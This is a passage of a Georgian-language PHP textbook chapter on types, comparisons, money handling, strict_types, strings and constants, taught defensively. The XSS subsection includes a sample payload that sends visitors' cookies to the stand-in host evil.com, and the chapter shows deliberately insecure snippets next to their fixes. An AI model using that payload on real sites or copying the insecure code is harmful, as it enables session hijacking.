## 1.1 რა არის PHP და სად სრულდება

PHP არის ენა, რომელიც **სერვერზე** სრულდება. ეს ერთი წინადადება უფრო მნიშვნელოვანია, ვიდრე ჩანს, და მისი არასწორად გაგება უსაფრთხოების ხვრელების ნახევარს ხსნის.

```
ბრაუზერი ──HTTP──► ვებ-სერვერი ──► PHP ──► HTML ──► ბრაუზერი
                                     │
                                     └──► მონაცემთა ბაზა
```

მომხმარებელი **ვერასოდეს** ხედავს შენს PHP კოდს. ის ხედავს მხოლოდ შედეგს. აქედან გამომდინარეობს ორი დასკვნა, რომლებიც მთელ წიგნს გასდევს:

1. **ყველაფერი, რაც სერვერზე რჩება, დაცულია. ყველაფერი, რაც ბრაუზერში მიდის, მომხმარებლის კონტროლშია.** JavaScript-ის ვალიდაცია არ არის ვალიდაცია — ის მოხერხებულობაა. ნამდვილი შემოწმება ხდება PHP-ში, ყოველთვის, გამონაკლისის გარეშე.
2. **ყველაფერი, რაც ბრაუზერიდან მოდის, არის მტრული, სანამ საპირისპირო არ დამტკიცდა.** URL-ის პარამეტრი, ფორმის ველი, ქუქი, header-ი, ატვირთული ფაილის სახელი — ყველა მათგანს მომხმარებელი თავისუფლად წერს ხელით.

### პირველი ფაილი

```php
<?php

declare(strict_types=1);

echo 'გამარჯობა';
```

სამი დეტალი, რომელიც პირველივე დღეს უნდა გახდეს ავტომატიზმი:

**ა) `<?php` არის აუცილებელი, `?>` — არა.**
ფაილში, რომელიც მხოლოდ PHP-ს შეიცავს, დახურვის ტეგს **არასოდეს** წერ. მიზეზი ტექნიკურია: `?>`-ის შემდეგ დარჩენილი ერთი ცარიელი ხაზიც კი გაიგზავნება ბრაუზერში, როგორც პასუხის სხეული. შედეგად HTTP header-ები დაბლოკილია და მიიღებ შეცდომას *"headers already sent"*, რომლის მიზეზის პოვნაც საათებს წაიღებს — შეცდომა ჩნდება იმ ფაილში, რომელიც ამ დროს იტვირთება, და არა იმაში, სადაც ზედმეტი ხაზია.

**ბ) `declare(strict_types=1);` — ყოველ ფაილში, პირველ ხაზად.**
ამის ახსნა 1.7-ში იქნება. ჯერჯერობით მიიღე როგორც წესი: მისი გარეშე PHP შენს ტიპებს ჩუმად გადააკეთებს და შენც ჩუმად მიიღებ არასწორ შედეგებს.

**გ) ის მოქმედებს მხოლოდ იმ ფაილზე, სადაც წერია.**
ეს არ არის გლობალური პარამეტრი. თუ 40 ფაილი გაქვს, ის 40-ჯერ უნდა ეწეროს. ეს გამოიყურება არა-DRY-ულად, მაგრამ არ არის: DRY ეხება *ცოდნის* დუბლირებას და არა ტექსტისას. ამაზე დეტალურად მე-16 თავში.

## 1.2 ცვლადები

```php
$productName = 'ლეპტოპი';
$price       = 249900;
$inStock     = true;
```

წესები:
- იწყება `$`-ით
- რეგისტრზე დამოკიდებულია: `$price` და `$Price` ორი სხვადასხვა ცვლადია
- დეკლარაცია არ საჭიროებს ტიპს — ტიპი მნიშვნელობიდან გამომდინარეობს

### სახელდება — არა სტილის, არამედ ინჟინერიის საკითხი

```php
// ❌
$d = 30;
$data = $repo->get();
$flag = true;
$tmp2 = $x * 0.18;

// ✅
$daysUntilExpiry = 30;
$pendingOrders   = $repo->findPending();
$isEmailVerified = true;
$vatAmount       = $netAmount * self::VAT_RATE;
```

მიზეზი პრაგმატულია და არა ესთეტიკური. კოდი **იკითხება ათჯერ უფრო ხშირად, ვიდრე იწერება.** `$d`-ს დაწერისას ერთ წამს ზოგავ და ყოველ წაკითხვაზე ათ წამს კარგავ — მათ შორის შენი მომავალი თავისთვის, ექვსი თვის შემდეგ, ღამის სამზე, ინციდენტის დროს.

წესები, რომლებსაც სენიორი იცავს:
- სახელი პასუხობს კითხვას "**რა** არის ეს", არა "რა ტიპისაა"
- ლოგიკური ცვლადი იწყება `is`/`has`/`can`-ით: `$isActive`, `$hasDiscount`, `$canRefund`
- სიმრავლე მრავლობითშია: `$products`, არა `$productList`
- აბრევიატურას იყენებ მხოლოდ მაშინ, თუ ის დომენში სტანდარტულია (`$sku`, `$vat`, `$url`)
- **სახელი არ ცრუობს.** `$users`, რომელშიც შეკვეთებია, უარესია, ვიდრე `$x`

### ცვლადი ცვლადები — ინსტრუმენტი, რომელსაც არასოდეს გამოიყენებ

```php
$name = 'price';
$$name = 100;      // ქმნის $price-ს
```

ეს არსებობს. **არასოდეს გამოიყენო.** ის კლავს სტატიკურ ანალიზს, ავტოშევსებას, ძებნას პროექტში ("სად ინიჭება ეს ცვლადი?" — პასუხი: ვერსად ვერ იპოვი), და თითქმის ყოველთვის ნიშნავს, რომ რეალურად მასივი გჭირდებოდა.

ეს არის პირველი მაგალითი წიგნის ერთ-ერთი მთავარი გაკვეთილისა: **ის, რომ ენა რაღაცის უფლებას იძლევა, არ ნიშნავს, რომ ეს ინსტრუმენტია. ხშირად ეს არის ისტორიული მემკვიდრეობა, რომელიც თავსებადობის გამო ვერ წაშალეს.**

## 1.3 ტიპები

PHP-ს აქვს რვა ტიპი. ცხრილი, რომელიც უნდა იცოდე ზეპირად:

| ტიპი | მაგალითი | შენიშვნა |
|---|---|---|
| `int` | `42`, `-7`, `0` | პლატფორმაზეა დამოკიდებული, ჩვეულებრივ 64-ბიტიანი |
| `float` | `3.14`, `1.2e3` | IEEE 754 ორმაგი სიზუსტე — **წაიკითხე 1.6** |
| `string` | `'ტექსტი'` | ბაიტების მიმდევრობა, არა სიმბოლოებისა |
| `bool` | `true`, `false` | |
| `array` | `[1, 2, 3]` | სინამდვილეში დალაგებული რუკაა — თავი 3 |
| `object` | `new Order()` | |
| `null` | `null` | "მნიშვნელობის არარსებობა" |
| `resource` | ფაილის დესკრიპტორი | ლეგასი, თანდათან ობიექტებით იცვლება |

```php
var_dump(42);        // int(42)
var_dump(42.0);      // float(42)
var_dump('42');      // string(2) "42"
var_dump(null);      // NULL
```

`var_dump()` არის შენი მთავარი დიაგნოსტიკური ინსტრუმენტი — ის აჩვენებს **ტიპსაც**, არა მხოლოდ მნიშვნელობას. `echo`-ს ამის ჩვენება არ შეუძლია: `echo 42` და `echo '42'` ერთნაირად გამოიყურება, თუმცა ეს სხვადასხვა ტიპია. ეს განსხვავება ბაგების დიდ ნაწილს განაპირობებს.

### `null` — ცალკე საკითხი

`null` არ არის ნული, არ არის ცარიელი სტრიქონი, არ არის `false`. ის ნიშნავს **"მნიშვნელობა არ არსებობს"**.

```php
$discount = null;      // ფასდაკლება არ განსაზღვრულა
$discount = 0;         // ფასდაკლება არსებობს და ის ნულოვანია
```

ეს განსხვავება რეალურია. "ჯერ არ შეყვანილი წონა" და "ნულოვანი წონა" სხვადასხვა ბიზნეს-ფაქტია, და კოდმა ისინი არ უნდა აურიოს.

მაგრამ `null` ასევე ყველაზე გავრცელებული ბაგის წყაროა (მისმა გამომგონებელმა, ტონი ჰოარმა, ის საჯაროდ "მილიარდ-დოლარიან შეცდომად" მოიხსენია). ამიტომ სენიორული პრაქტიკა არის **`null`-ის რაოდენობის მიზანმიმართული შემცირება**:
- ცარიელი მასივი სჯობს `null`-ს სიის დაბრუნებისას
- Null Object პატერნი სჯობს გამუდმებულ `if ($x !== null)` შემოწმებებს
- გამონაკლისი სჯობს `null`-ს, როცა "ვერ ვიპოვე" შეცდომაა და არა ნორმალური შედეგი

ეს არ ნიშნავს `null`-ის აკრძალვას. ეს ნიშნავს, რომ ყოველი `null` შენს კოდში უნდა იყოს **გადაწყვეტილება**, და არა ნაგულისხმევი დაუდევრობა.

## 1.4 ტიპთა კონვერსია — სადაც იბადება ბაგების ნახევარი

PHP დინამიკურად ტიპიზებული ენაა და საჭიროებისამებრ ტიპებს თავად გარდაქმნის. ეს მოხერხებულია და საშიში.

```php
var_dump('5' + 3);        // int(8)     — სტრიქონი გახდა რიცხვი
var_dump('5' . 3);        // string "53" — რიცხვი გახდა სტრიქონი
var_dump(true + true);    // int(2)
var_dump('abc' == 0);     // PHP 7: true (!) | PHP 8: false
```

ბოლო ხაზი არის ერთ-ერთი ყველაზე მნიშვნელოვანი ცვლილება PHP 8-ში. PHP 7-ში `'abc' == 0` იძლეოდა `true`-ს, რადგან სტრიქონი რიცხვად გარდაიქმნებოდა და `'abc'` ხდებოდა `0`. ამ ქცევამ რეალური ავთენტიფიკაციის შემოვლები გამოიწვია.

PHP 8-ში წესი შეიცვალა: **როცა რიცხვს არარიცხვით სტრიქონს ადარებ, ახლა რიცხვი გარდაიქმნება სტრიქონად და არა პირიქით.**

### `==` vs `===`

| ოპერატორი | ამოწმებს |
|---|---|
| `==` | მნიშვნელობებს კონვერსიის შემდეგ ("თავისუფალი" შედარება) |
| `===` | მნიშვნელობასაც **და** ტიპსაც ("მკაცრი" შედარება) |

```php
var_dump(0 == '0');          // true
var_dump(0 === '0');         // false
var_dump(null == false);     // true
var_dump(null === false);    // false
var_dump([] == false);       // true
var_dump('1e3' == '1000');   // true — ორივე რიცხვითი სტრიქონია!
```

**წესი, რომელიც არასოდეს დაარღვიო: ყოველთვის `===`.**

`==`-ის გამოყენება ლეგიტიმურია მხოლოდ მაშინ, როცა შენ ცხადად, შეგნებულად გინდა კონვერსია და კომენტარშიც ხსნი, რატომ. პრაქტიკაში ეს წელიწადში ერთხელ ხდება.

რატომ არის ეს უსაფრთხოების და არა სტილის საკითხი — რეალური მაგალითი:

```php
// ❌ დაუცველი
if ($providedToken == $storedToken) { /* დაშვება */ }
```

თუ ორივე სტრიქონი "რიცხვითი" აღმოჩნდება მაგალითად `'0e123'` და `'0e456'` სახით, `==` ორივეს მეცნიერული ჩანაწერის ნულად გარდაქმნის და შედარება **დადებითს** დააბრუნებს. ეს არის ცნობილი "magic hash" შეტევა და ის რეალურ სისტემებში მუშაობდა.

```php
// ✅ სწორი — მკაცრი შედარება საიდუმლოებისთვის
if (hash_equals($storedToken, $providedToken)) { /* დაშვება */ }
```

`hash_equals()` ასევე მუდმივ დროში მუშაობს, რაც დროზე დაფუძნებულ შეტევებს კლავს. ამაზე 31-ე თავში.

### ლოგიკური კონვერსია — რა არის `false`

დაიმახსოვრე ეს სია. ყველაფერი დანარჩენი არის `true`:

```php
false, 0, -0, 0.0, -0.0, '', '0', [], null
```

აქ ორი ხაფანგია:

```php
var_dump((bool) '0');        // false — სტრიქონი "ნული" არის false
var_dump((bool) '0.0');      // true  — ხოლო "ნული წერტილი ნული" არის true
var_dump((bool) ' ');        // true  — ცარიელი ადგილი არის true
var_dump((bool) '0000');     // true
```

პრაქტიკული შედეგი:

```php
// ❌ ჩავარდება, თუ მომხმარებელმა შეიყვანა "0"
if (!$_POST['comment']) {
    throw new ValidationError('კომენტარი სავალდებულოა');
}

// ✅
if (trim($_POST['comment'] ?? '') === '') {
    throw new ValidationError('კომენტარი სავალდებულოა');
}
```

პირველი ვერსია უარყოფს სრულიად ვალიდურ კომენტარს `"0"`. ეს არის ის ტიპის ბაგი, რომელიც წლობით ცხოვრობს პროდაქშენში, სანამ ვინმე ერთ სიმბოლოს არ დაწერს.

## 1.5 ოპერატორები და პრიორიტეტი

### არითმეტიკა

```php
$a + $b;    $a - $b;    $a * $b;    $a / $b;
$a % $b;    // ნაშთი — მხოლოდ მთელებზე
$a ** $b;   // ხარისხი
intdiv(10, 3);   // 3 — მთელი ნაწილი
```

`/` **ყოველთვის** აბრუნებს `float`-ს, თუ შედეგი მთელი არაა:
```php
var_dump(10 / 2);    // int(5)
var_dump(10 / 3);    // float(3.3333...)
```

ნულზე გაყოფა PHP 8-ში აგდებს `DivisionByZeroError`-ს (ადრე იყო warning + `INF`). ეს გაუმჯობესებაა: ჩუმი არასწორი შედეგი ყოველთვის უარესია, ვიდრე ხმაურიანი შეცდომა.

### მინიჭების შემოკლებები

```php
$total += 100;    $total -= 50;    $total *= 2;
$name .= ' ჯონსონი';
$config ??= [];        // ანიჭებს მხოლოდ თუ null-ია ან არ არსებობს
```

### შედარებები

```php
$a <=> $b;   // "კოსმოსური ხომალდი": -1, 0 ან 1 — სორტირებისთვის
$a ?? $b;    // null coalescing: $a, თუ ის არსებობს და არაა null
$a ?: $b;    // შემოკლებული სამმაგი: $a, თუ ის truthy-ია
```

განსხვავება `??`-სა და `?:`-ს შორის კრიტიკულია:

```php
$qty = $_GET['qty'] ?? 1;    // "0" დარჩება "0" ✅
$qty = $_GET['qty'] ?: 1;    // "0" გახდება 1  ❌ + Warning, თუ არ არსებობს
```

`??` ამოწმებს **არსებობას და `null`-ს**. `?:` ამოწმებს **სიმართლისმაგვარობას**. მომხმარებლის შეყვანასთან თითქმის ყოველთვის `??` გინდა.

### ლოგიკური ოპერატორები და პრიორიტეტის ხაფანგი

PHP-ს აქვს **ორი ნაკრები** ლოგიკური ოპერატორისა და ეს ისტორიული შეცდომაა:

```php
&&  ||  !        // მაღალი პრიორიტეტი
and or xor       // ძალიან დაბალი პრიორიტეტი — მინიჭებაზე დაბალიც კი
```

ეს განსხვავება ქმნის კლასიკურ ბაგს:

```php
$result = true and false;
var_dump($result);   // bool(true) — არა false!
```

რა მოხდა: `and`-ის პრიორიტეტი **დაბალია** `=`-ზე, ამიტომ PHP კითხულობს ასე:
```php
($result = true) and false;
```
მინიჭება პირველი მოხდა, `and` კი შემდეგ — და მისი შედეგი არსად წავიდა.

```php
$result = true && false;
var_dump($result);   // bool(false) ✅
```

**წესი: იყენებ მხოლოდ `&&`, `||`, `!`-ს. `and`/`or` არ არსებობს შენთვის.**

პრიორიტეტის საერთო წესი, რომელიც ბევრ პრობლემას გიხსნის: **როცა ეჭვი გაქვს, დასვი ფრჩხილები.** ფრჩხილები უფასოა. პრიორიტეტის ცხრილის ზეპირად სწავლა კი უაზროა — მისი ცოდნა კოდს არ აუმჯობესებს, ფრჩხილები კი აუმჯობესებს.

## 1.6 რიცხვები, ფული და `float`-ის საშიშროება

აქ არის ამ თავის ყველაზე მნიშვნელოვანი პრაქტიკული გაკვეთილი.

```php
var_dump(0.1 + 0.2);            // float(0.30000000000000004)
var_dump(0.1 + 0.2 === 0.3);    // false
```

ეს არ არის PHP-ს ბაგი. ეს არის IEEE 754 სტანდარტი, რომელსაც ყველა ენა იყენებს. `float` ინახავს რიცხვს **ორობით სისტემაში**, ხოლო 0.1 ორობითში არის უსასრულო პერიოდული წილადი — ისევე, როგორც 1/3 ათობითში. ის ინახება მიახლოებით.

**შედეგი მაღაზიისთვის:**

```php
// ❌ ფინანსური ინციდენტი, რომელიც ჯერ არ მომხდარა
$price = 19.99;
$total = 0.0;
for ($i = 0; $i < 100; $i++) {
    $total += $price;
}
var_dump($total);    // 1998.9999999999998 — არა 1999.00
```

100 პროდუქტზე ცდომილება მიკროსკოპულია. 100 000 ტრანზაქციაზე დღეში — ეს არის ბუღალტრული შეუსაბამობა, რომელსაც ვერავინ ხსნის.

**გადაწყვეტა: ფული ინახება მთელ რიცხვად, უმცირეს ერთეულში.**

```php
// ✅ 1999.00 ₾ ინახება როგორც 199900 თეთრი
$priceInTetri = 199900;
$total = 0;
for ($i = 0; $i < 100; $i++) {
    $total += $priceInTetri;
}
// 19990000 — ზუსტი, გამონაკლისის გარეშე

// ჩვენებისთვის:
echo number_format($total / 100, 2, '.', ' ');   // 199 900.00
```

ეს არის უნივერსალური პრაქტიკა: Stripe, PayPal და ყველა სერიოზული საგადახდო სისტემა თანხას მთელ რიცხვად გადასცემს. თუ ინტერვიუზე გკითხავენ "როგორ ინახავ ფასს" და უპასუხებ "`decimal`-ად ან `float`-ად" — `float` არის ავტომატური ჩავარდნა, `decimal` მისაღები პასუხია ბაზისთვის, ხოლო **მთელი რიცხვი უმცირეს ერთეულში + ვალუტა** არის სენიორული პასუხი.

მე-10 თავში ამას გადავაქცევთ `Money` Value Object-ად, სადაც ვალუტაც იქნება ტიპის ნაწილი და ლარის დოლართან შეკრება შეუძლებელი გახდება **კომპილაციის და არა ტესტირების დონეზე**.

**როცა float-ის შედარება მაინც გჭირდება** (გაზომვები, კოეფიციენტები):
```php
if (abs($a - $b) < PHP_FLOAT_EPSILON) { /* პრაქტიკულად ტოლია */ }
```

## 1.7 `strict_types` — რატომ არის ის სავალდებულო

PHP-ს აქვს ორი რეჟიმი ტიპების შემოწმებისთვის.

**იძულებითი (ნაგულისხმევი):**
```php
<?php
function applyDiscount(int $percent): int { return $percent; }

var_dump(applyDiscount('10'));    // int(10) — სტრიქონი ჩუმად გახდა რიცხვი
var_dump(applyDiscount(10.9));    // int(10) — წილადი ჩუმად მოიკვეთა (!)
```

მეორე ხაზი განსაკუთრებით საშიშია: 10.9 გახდა 10 **ინფორმაციის დაკარგვით და გაფრთხილების გარეშე**.

**მკაცრი:**
```php
<?php
declare(strict_types=1);

function applyDiscount(int $percent): int { return $percent; }

applyDiscount('10');    // TypeError
applyDiscount(10.9);    // TypeError
applyDiscount(10);      // ✅
```

**რატომ არის მკაცრი რეჟიმი ერთადერთი მისაღები არჩევანი:**

1. **შეცდომა ჩნდება იქ, სადაც მიზეზია.** იძულებით რეჟიმში არასწორი ტიპი ჩუმად გაივლის ხუთ ფენას და ბაგი გამოვლინდება სულ სხვა ადგილას, სადაც მიზეზი აღარ ჩანს. ეს არის განსხვავება 5-წუთიან და 5-საათიან დებაგინგს შორის.
2. **ტიპი ხდება რეალური კონტრაქტი.** თუ ფუნქცია ამბობს `int`, ის მართლა იღებს `int`-ს. ამის გარეშე ტიპური დეკლარაცია მხოლოდ სურვილია.
3. **სტატიკური ანალიზი მუშაობს.** PHPStan-ს შეუძლია დაამტკიცოს კოდის სისწორე მხოლოდ მაშინ, როცა ტიპებს ენდობა.

**ერთადერთი გამონაკლისი, რომელიც არსებობს:** `int` ავტომატურად ვრცელდება `float`-ზე მკაცრ რეჟიმშიც — `function f(float $x)` მიიღებს `5`-ს. ეს განზრახაა, რადგან ყოველი `int` ზუსტად წარმოდგება `float`-ად.

**წესი: `declare(strict_types=1);` ყოველი ფაილის პირველ ხაზზე, პროექტის პირველივე დღიდან.** არსებულ პროექტში მისი შემდგომი დამატება მტკივნეულია, რადგან ის ერთდროულად ამხელს ყველა ჩუმ კონვერსიას, რომელიც წლების განმავლობაში დაგროვდა.

## 1.8 სტრიქონები

### ბრჭყალების ოთხი სახე

```php
// ერთმაგი — არაფერი არ ინტერპრეტირდება (გარდა \' და \\)
$a = 'ფასია $price';           // ზუსტად ასე დაიბეჭდება

// ორმაგი — ცვლადები ინტერპრეტირდება
$b = "ფასია $price";           // ფასია 199900
$c = "ფასია {$order->total}";  // რთული გამოსახულებისთვის ფიგურული ფრჩხილები

// Heredoc — ორმაგივით, მრავალხაზოვანი
$html = <<<HTML
    <div class="product">
        <h2>{$name}</h2>
    </div>
    HTML;

// Nowdoc — ერთმაგივით, მრავალხაზოვანი
$template = <<<'TPL'
    გამარჯობა {{name}}
    TPL;
```

პრაქტიკული წესი: **ნაგულისხმევად ერთმაგი ბრჭყალები**, ორმაგი მხოლოდ მაშინ, როცა ინტერპოლაცია მართლა გჭირდება. ეს ერთგვაროვნებას ქმნის და მკითხველს აჩვენებს, სად უნდა ეძებოს ცვლადი.

### სიგრძე და მრავალბაიტიანობა — ქართული ტექსტის ხაფანგი

```php
$name = 'გიორგი';
var_dump(strlen($name));       // 18 — ბაიტების რაოდენობა!
var_dump(mb_strlen($name));    // 6  — სიმბოლოების რაოდენობა ✅
```

PHP-ს სტრიქონი არის **ბაიტების მიმდევრობა**, არა სიმბოლოებისა. ლათინურ ტექსტზე ეს ერთი და იგივეა, ქართულზე — არა: ერთი ქართული ასო UTF-8-ში სამ ბაიტს იკავებს.

ამიტომ, პროექტში, სადაც ქართული ტექსტია:
- `strlen()` → `mb_strlen()`
- `substr()` → `mb_substr()`
- `strtoupper()` → `mb_strtoupper()`
- `str_split()` → `mb_str_split()`

`substr()`-ის გამოყენება ქართულ ტექსტზე **ფიზიკურად ჭრის სიმბოლოს შუაზე** და გამონატანში იღებ დაზიანებულ ბაიტებს. ეს არის ის ბაგი, რომელიც ინგლისურენოვან ტესტებში არასოდეს გამოვლინდება.

### გამონატანის უსაფრთხოება — პირველი შეხება XSS-თან

```php
// ❌ XSS-ის ხვრელი
echo '<h1>' . $_GET['search'] . '</h1>';
```

თუ მომხმარებელი გახსნის `?search=<script>fetch('//evil.com?c='+document.cookie)</script>`, ეს სკრიპტი შესრულდება საიტის ყველა სტუმრის ბრაუზერში და გაიტანს მათ სესიის ქუქებს.

```php
// ✅
echo '<h1>' . htmlspecialchars($_GET['search'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</h1>';
```

წესი, რომელიც ახლავე უნდა გახდეს რეფლექსი: **ყოველი მნიშვნელობა, რომელიც HTML-ში მიდის და მომხმარებლისგან მოდის, გადის escape-ს.** გამონაკლისების გარეშე.

ეს არ არის სრული პასუხი XSS-ზე — `htmlspecialchars()` საკმარისია მხოლოდ HTML-ის ტექსტურ კონტექსტში და არასაკმარისია JavaScript-ის, ატრიბუტის ან URL-ის შიგნით. სრული სურათი მე-30 თავშია. მაგრამ ეს ჩვევა დღესვე უნდა ჩამოყალიბდეს, რადგან მოგვიანებით მისი "დამატება" ნიშნავს ასეული ადგილის გადამოწმებას.

## 1.9 კონსტანტები

```php
const VAT_RATE = 0.18;                    // კომპილაციისას, ფაილის დონეზე
define('APP_ENV', 'production');          // შესრულებისას

final class Order
{
    public const STATUS_PENDING = 'pending';
    public const MAX_ITEMS = 100;
}
```

**რატომ არსებობს კონსტანტები:** მაგიური რიცხვები კოდში არის ტექნიკური ვალი. `if ($count > 100)` არაფერს ამბობს — რატომ 100? ვინ გადაწყვიტა? სად არის ეს ლიმიტი კიდევ გამოყენებული?

```php
// ❌
if (count($items) > 100) { ... }
$total = $net * 0.18;

// ✅
if (count($items) > Order::MAX_ITEMS) { ... }
$vat = $net * self::VAT_RATE;
```

მოგება არ არის მხოლოდ კითხვადობა. **დღგ-ს განაკვეთი შეიცვლება.** როცა ეს მოხდება, პირველ ვერსიაში ეძებ `0.18`-ს ორმოცდაათ ფაილში (და გამოტოვებ იმას, სადაც `0.180` წერია, ან სადაც ის სხვა მნიშვნელობას ნიშნავს). მეორე ვერსიაში ცვლი ერთ ხაზს.

**ეს არის DRY-ის რეალური განმარტება:** *ყოველ ცოდნას სისტემაში უნდა ჰქონდეს ერთი, ცალსახა, ავტორიტეტული წარმომადგენლობა.* DRY არ ეხება ერთნაირად გამოყურებადი კოდის ხაზებს — ის ეხება **ცოდნის დუბლირებას**. ორი ხაზი, რომლებიც შემთხვევით ერთნაირია, მაგრამ სხვადასხვა ბიზნეს-წესს გამოხატავს, არ არის DRY-ის დარღვევა — და მათი "გაერთიანება" აქტიური ზიანია, რადგან ისინი დამოუკიდებლად შეიცვლება.

## 1.11 როგორ ფიქრობს სენიორი

**1. "ტიპი არის კონტრაქტი, არა შემოთავაზება."**
ყოველი ფუნქცია აცხადებს, რას იღებს და რას აბრუნებს. ეს არ არის ბიუროკრატია — ეს არის ერთადერთი გზა, რომ კოდზე მსჯელობა შესაძლებელი გახდეს მისი ყოველი გამოძახების ადგილის წაკითხვის გარეშე.

**2. "ჩუმი ქცევა ყოველთვის უარესია, ვიდრე ხმაურიანი შეცდომა."**
ეს ერთი პრინციპი ხსნის, რატომ არის `strict_types` სავალდებულო, `===` სავალდებულო, და რატომ არის PHP 8-ის ცვლილება ნულზე გაყოფაზე გაუმჯობესება. კოდი, რომელიც შეცდომისას იშლება, არის კოდი, რომელსაც ენდობი. კოდი, რომელიც შეცდომისას აგრძელებს არასწორი მონაცემით, არის კოდი, რომელიც ერთ დღეს ძვირად დაგიჯდება.

**3. "მონაცემის წარმოდგენა არის დიზაინის გადაწყვეტილება, არა დეტალი."**
ფასი მთელ რიცხვად. თარიღი დროის ზონით. იდენტიფიკატორი ტიპიზებული. ეს გადაწყვეტილებები მიიღება პროექტის დასაწყისში, რადგან მათი შემდგომი შეცვლა ნიშნავს მიგრაციას, ისტორიული მონაცემების გადათვლას და რისკს.

**4. "ის, რომ ენა უფლებას იძლევა, არ ნიშნავს, რომ ეს ინსტრუმენტია."**
`$$var`, `goto`, `@`-ით შეცდომების ჩახშობა, `extract()` — ეს ყველაფერი არსებობს და თითქმის არასოდეს არის სწორი პასუხი.

## 1.12 პროექტი — პირველი ნაბიჯი
